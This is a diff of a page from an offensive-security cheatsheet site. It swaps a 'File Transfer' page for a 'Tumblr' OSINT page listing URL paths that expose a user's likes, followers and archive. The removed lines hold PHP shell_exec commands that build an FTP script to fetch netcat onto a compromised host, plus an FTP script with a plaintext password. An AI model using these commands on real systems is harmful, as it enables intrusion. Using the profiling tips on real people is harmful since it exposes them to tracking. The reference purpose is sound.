@@ -5,8 +5,8 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2020-05-12T14:20:26 CEST">
-<title>File Transfer :: Offensive Security Cheatsheet</title>
+<meta name="revised" content="2020-05-12T14:20:27 CEST">
+<title>Tumblr :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -23,7 +23,7 @@
 
     
   </head>
-  <body data-url="/linux-systems/file_transfer/">
+  <body data-url="/open-source-intelligence-osint/platforms-hunting/tumblr/">
     
       <header>
   <div class="logo">
@@ -61,10 +61,11 @@
             <i class="fa fa-fw fa-home"></i>
           </a>
           </li>
-    <li data-nav-id="/open-source-intelligence-osint/" class="dd-item haschildren
+    <li data-nav-id="/open-source-intelligence-osint/" class="dd-item parent haschildren
         ">
       <div>
-      <a href="/open-source-intelligence-osint/">Open Source Intelligence (OSINT)</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/open-source-intelligence-osint/">Open Source Intelligence (OSINT)</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
     <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/" class="dd-item haschildren
@@ -375,10 +376,11 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/" class="dd-item haschildren
+    <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/" class="dd-item parent haschildren
         ">
       <div>
-      <a href="/open-source-intelligence-osint/platforms-hunting/">Platforms Hunting</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/open-source-intelligence-osint/platforms-hunting/">Platforms Hunting</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
       <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/google/" class="dd-item">
@@ -451,7 +453,7 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/tumblr/" class="dd-item">
+      <li data-nav-id="/open-source-intelligence-osint/platforms-hunting/tumblr/" class="dd-item active">
         <div>
           <a href="/open-source-intelligence-osint/platforms-hunting/tumblr/">
             Tumblr
@@ -1329,11 +1331,10 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/linux-systems/" class="dd-item parent haschildren
+    <li data-nav-id="/linux-systems/" class="dd-item haschildren
         ">
       <div>
-      <a href="/linux-systems/">Linux Systems</a>
-            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/linux-systems/">Linux Systems</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
       <li data-nav-id="/linux-systems/recon_enumeration/" class="dd-item">
@@ -1343,7 +1344,7 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/linux-systems/file_transfer/" class="dd-item active">
+      <li data-nav-id="/linux-systems/file_transfer/" class="dd-item">
         <div>
           <a href="/linux-systems/file_transfer/">
             File Transfer
@@ -1575,6 +1576,21 @@
       <a href="/pwn/">Pwn</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
+    <li data-nav-id="/pwn/buffer-overflow/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/pwn/buffer-overflow/">Buffer Overflow (BoF)</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/pwn/buffer-overflow/easy_no_protection/" class="dd-item">
+        <div>
+          <a href="/pwn/buffer-overflow/easy_no_protection/">
+            Easy - No Protections
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
       <li data-nav-id="/pwn/general_infos/" class="dd-item">
         <div>
           <a href="/pwn/general_infos/">
@@ -1635,7 +1651,39 @@
         <select onchange="javascript:location.href = this.value;">
           
     <option value="/open-source-intelligence-osint/" >
-   Open Source Intelligence (OSINT)</option>
+   Open Source Intelligence (OSINT)</option> 
+    <option value="/open-source-intelligence-osint/tools-and-methodology/" >
+  - 
+   Tools &amp; Methodology</option>
+    <option value="/open-source-intelligence-osint/dorks/" >
+  - 
+   Dorks</option>
+    <option value="/open-source-intelligence-osint/technical-recon/" >
+  - 
+   Technical Investigation</option>
+    <option value="/open-source-intelligence-osint/company_investigations/" >
+  - 
+   Company Investigations</option>
+    <option value="/open-source-intelligence-osint/human-recon/" >
+  - 
+   Human Investigation</option>
+    <option value="/open-source-intelligence-osint/platforms-hunting/" >
+  - 
+   Platforms Hunting</option> 
+      <option value="/open-source-intelligence-osint/platforms-hunting/google/" >-- Google</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/linkedin/" >-- LinkedIn</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/twitter/" >-- Twitter</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/facebook/" >-- Facebook</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/instagram/" >-- Instagram</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/snapchat/" >-- Snapchat</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/tiktok/" >-- TikTok</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/tinder/" >-- Tinder</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/github/" >-- Github</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/reddit/" >-- Reddit</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/tumblr/"  selected>-- Tumblr</option>
+      <option value="/open-source-intelligence-osint/platforms-hunting/amazon_digitalocean/" >-- Amazon &amp; Digital Ocean Buckets</option>
+  
+  
     <option value="/web-pentest/" >
    Web Pentest</option>
     <option value="/network/" >
@@ -1645,16 +1693,7 @@
     <option value="/windows-systems/" >
    Windows Systems</option>
     <option value="/linux-systems/" >
-   Linux Systems</option> 
-      <option value="/linux-systems/recon_enumeration/" >- Recon and Enumeration</option>
-      <option value="/linux-systems/file_transfer/"  selected>- File Transfer</option>
-    <option value="/linux-systems/privilege-escalation/" >
-  - 
-   Privilege Escalation</option>
-    <option value="/linux-systems/programing-languages/" >
-  - 
-   Programing Languages</option>
-  
+   Linux Systems</option>
     <option value="/other-systems/" >
    Other Systems</option>
     <option value="/passcracking-hashfiles/" >
@@ -1691,45 +1730,43 @@
       </div>
     
 
-    <h1>File Transfer</h1>
+    <h1>Tumblr</h1>
     
     
     
     
 
-<h3 id="nfs">NFS</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You can remotely mount NFS volumes</span>
-mount -t nfs xx.xx.xx.xx:/ /tmp/a</code></pre></div>
-<p><br/></p>
+<h3 id="basics">Basics</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://www.secjuice.com/tumblr-osint/
 
-<h3 id="linux-ftp">Linux FTP</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
-</span><span style="color:#75715e"></span>
-ftp -n IP <span style="color:#d88200">&lt;&lt;END_SCRIPT
-</span><span style="color:#d88200">quote USER acknak
-</span><span style="color:#d88200">quote PASS jLQRZy4gyLhmMqz2whTw
-</span><span style="color:#d88200">binary
-</span><span style="color:#d88200">GET file.py
-</span><span style="color:#d88200">quit
-</span><span style="color:#d88200">END_SCRIPT</span>
-<span style="color:#111">exit</span> <span style="color:#ae81ff">0</span>
+<span style="color:#75715e"># Tumblr is an old platform (2007) and may contain old target accounts not deleted</span>
+<span style="color:#75715e"># For example, old blogs</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Username will appear on the URL</span>
+<span style="color:#75715e"># As well as on multiple points</span>
+userxxx.tumblr.com</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># User&#39;s likes</span>
+<span style="color:#75715e"># The section can be disabled by the user</span>
 
+<span style="color:#75715e"># To find out</span>
+userxx.tumblr.com/likes
 
-<span style="color:#75715e"># Can also be done over php:</span>
-&lt;?php <span style="color:#111">echo</span> shell_exec<span style="color:#f92672">(</span><span style="color:#d88200">&#34;echo open 192.168.42.102 21&gt;/usr/local/databases/ftp.txt&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>?&gt;
-&lt;?php <span style="color:#111">echo</span> shell_exec<span style="color:#f92672">(</span><span style="color:#d88200">&#34;echo user acknak jLQRZy4gyLhmMqz2whTw&gt;&gt; /usr/local/databases/ftp.txt&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>?&gt;
-&lt;?php <span style="color:#111">echo</span> shell_exec<span style="color:#f92672">(</span><span style="color:#d88200">&#34;echo binary&gt;&gt; /usr/local/databases/ftp.txt&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>?&gt;
-&lt;?php <span style="color:#111">echo</span> shell_exec<span style="color:#f92672">(</span><span style="color:#d88200">&#34;echo get netcat /usr/local/databases/netcat&gt;&gt;/usr/local/databases/ftp.txt&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>?&gt;
-&lt;?php <span style="color:#111">echo</span> shell_exec<span style="color:#f92672">(</span><span style="color:#d88200">&#34;echo bye&gt;&gt; /usr/local/databases/ftp.txt&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>?&gt;
+<span style="color:#75715e"># Same for followers / following</span>
+userxx.tumblr.com/followers
+userxx.tumblr.com/following
 
-&lt;?php <span style="color:#111">echo</span> shell_exec<span style="color:#f92672">(</span><span style="color:#d88200">&#34;ftp -n &lt; /usr/local/databases/ftp.txt&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>?&gt;</code></pre></div>
+userxx.tumblr.com/Followers
+userxx.tumblr.com/FOLLOWERS</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Archives</span>
+<span style="color:#75715e"># User&#39;s posts, media, reblog, text...</span>
+userxx.tumblr.com/archive</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Interesting elements on posts :</span> 
+<span style="color:#75715e"># - Text</span>
+<span style="color:#75715e"># - Pictures</span>
+<span style="color:#75715e"># - Tags</span>
+<span style="color:#75715e"># - User interactions</span></code></pre></div>
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/linux-systems/recon_enumeration/" title="Recon and Enumeration"> <i class="fa fa-chevron-left"></i><label>Recon and Enumeration</label></a>
-    <a class="nav nav-next" href="/linux-systems/privilege-escalation/" title="Privilege Escalation" style="margin-right: 0px;"><label>Privilege Escalation</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/open-source-intelligence-osint/platforms-hunting/reddit/" title="Reddit"> <i class="fa fa-chevron-left"></i><label>Reddit</label></a>
+    <a class="nav nav-next" href="/open-source-intelligence-osint/platforms-hunting/amazon_digitalocean/" title="Amazon &amp; Digital Ocean Buckets" style="margin-right: 0px;"><label>Amazon &amp; Digital Ocean Buckets</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -1746,7 +1783,7 @@ ftp -n IP <span style="color:#d88200">&lt;&lt;END_SCRIPT
 
     
     <div class="github-link">
-      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Linux%20Systems/File_Transfer.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Open%20Source%20Intelligence%20%28OSINT%29/Platforms%20Hunting/Tumblr.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
